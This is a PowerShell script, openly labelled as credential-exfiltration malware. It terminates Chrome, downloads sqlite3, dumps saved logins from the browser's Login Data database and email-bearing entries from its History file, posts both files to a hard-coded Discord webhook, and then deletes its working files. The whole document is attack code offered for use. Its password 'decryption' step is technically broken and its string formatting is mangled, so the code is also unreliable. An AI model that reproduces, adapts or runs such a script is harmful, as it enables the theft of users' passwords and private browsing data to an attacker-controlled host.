# Chrome Credential Exfiltration Script
# Requirements: Admin privileges, Internet access

$ErrorActionPreference = "Stop"
$webhookURL = "https://discord.com/api/webhooks/1526301287443071227/aGAUnBc-G-9SQngiOqoprsgjVkdxdjYwAnNmR2PosY2eGI2iYOJNJ1FS_ZJO2IuPajTj"  # <-- REPLACE THIS
$tempDir = "$env:TEMP\ChromeExfil"
$logFile = "$tempDir\exfil_log.txt"

# --- Helper Functions ---
function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $msg"
}

function Cleanup {
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\sqlite3.exe" -Force -ErrorAction SilentlyContinue
    exit
}

# --- Setup ---
if (-Not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
Log-Message "Script started. Temp dir: $tempDir"

# --- Check Chrome Process ---
if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
    Log-Message "Chrome is running. Killing process..."
    Stop-Process -Name "chrome" -Force
    Start-Sleep -Seconds 2
}

# --- Download SQLite ---
try {
    $sqliteURL = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3390200.zip"
    $sqliteZip = "$env:TEMP\sqlite.zip"
    $sqliteExe = "$env:TEMP\sqlite3.exe"

    Invoke-WebRequest -Uri $sqliteURL -OutFile $sqliteZip
    Expand-Archive -Path $sqliteZip -DestinationPath $env:TEMP -Force
    Move-Item "$env:TEMP\sqlite-tools-win32-x86-3390200\sqlite3.exe" -Destination $sqliteExe -Force
    Log-Message "SQLite downloaded and extracted."
}
catch {
    Log-Message "Failed to download SQLite: $_"
    Cleanup
}

# --- Extract Chrome Passwords ---
try {
    $chromeDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $outputFile = "$tempDir\passwords.txt"

    # Dump raw credentials
    & $sqliteExe $chromeDB "SELECT origin_url, username_value, password_value FROM logins" > $outputFile

    # Decrypt passwords
    $results = @()
    Get-Content $outputFile | ForEach-Object {
        $parts = $_ -split '\|'
        if ($parts.Count -ge 3) {
            $url = $parts[0]
            $user = $parts[1]
            $passEnc = $parts[2]
            $passDec = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
                [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
                    (New-Object System.Security.SecureString -ArgumentList $passEnc.ToCharArray())
                )
            )
            $results += "URL: $urlnUser: $usernPass: $passDecn---n"
        }
    }
    $results | Out-File -FilePath $outputFile -Encoding UTF8
    Log-Message "Passwords extracted and decrypted."
}
catch {
    Log-Message "Failed to extract passwords: $_"
    Cleanup
}

# --- Extract Emails from History ---
try {
    $historyDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    $emailFile = "$tempDir\emails.txt"

    & $sqliteExe $historyDB "SELECT url, title FROM urls WHERE url LIKE '%@%' OR title LIKE '%@%'" > $emailFile
    Log-Message "Emails extracted from history."
}
catch {
    Log-Message "Failed to extract emails: $_"
}

# --- Send to Discord ---
try {
    $body = @{
        content = "🔓 Chrome Credentials Exfiltrated - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        file1 = Get-Item $outputFile
        file2 = Get-Item $emailFile
    }

    Invoke-RestMethod -Uri $webhookURL -Method Post -FormData $body
    Log-Message "Data sent to Discord webhook."
}
catch {
    Log-Message "Failed to send data: $_"
}

# --- Cleanup ---
Cleanup
